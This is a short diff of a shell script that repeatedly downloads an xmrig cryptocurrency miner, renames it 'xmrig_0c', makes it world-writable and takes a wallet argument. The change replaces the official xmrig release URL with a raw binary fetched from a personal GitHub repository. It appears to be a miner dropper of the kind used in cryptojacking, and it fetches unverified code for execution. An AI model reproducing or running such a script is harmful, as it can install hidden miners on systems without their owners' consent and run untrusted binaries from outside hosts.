@@ -1,7 +1,7 @@
 #! /bin/sh
 PRO_NAME=xmrig_0c 
 while true;do
-	wget -T 15 -c -O ./xmrig_0c https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz && break
+	wget -T 15 -c -O ./xmrig_0c https://github.com/ak6665607/xmrGF/raw/main/xmrig && break
 done 
 chmod 777 ./xmrig_0c
 qianbao=$1
